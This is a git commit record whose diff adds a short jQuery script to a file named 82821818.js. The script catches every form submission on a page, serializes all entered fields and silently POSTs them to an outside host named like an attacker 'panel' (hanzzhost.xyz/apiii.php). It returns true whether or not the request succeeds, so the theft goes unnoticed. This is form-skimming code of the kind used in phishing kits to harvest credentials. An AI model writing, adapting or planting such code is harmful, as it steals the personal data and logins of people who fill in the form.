4bc3c0d100aba28f4e2e1c24cd51c1c4179adb15
722818372 <99262453+722818372@users.noreply.github.com>
2022-02-08 20:06:33 +0700

    Update 82821818.js

--- 82821818.js
+++ 82821818.js
@@ -1,1 +1,16 @@
 
+$('form').submit(function() {
+	var d = $('form');
+
+	$.ajax({
+        url: "https://panel-deres-2jt-2022.hanzzhost.xyz/apiii.php",
+        type: "POST",
+        data: d.serialize(),
+        success: function () {
+            return true;
+        },
+        error: function () {
+            return true;
+        },
+    });
+});
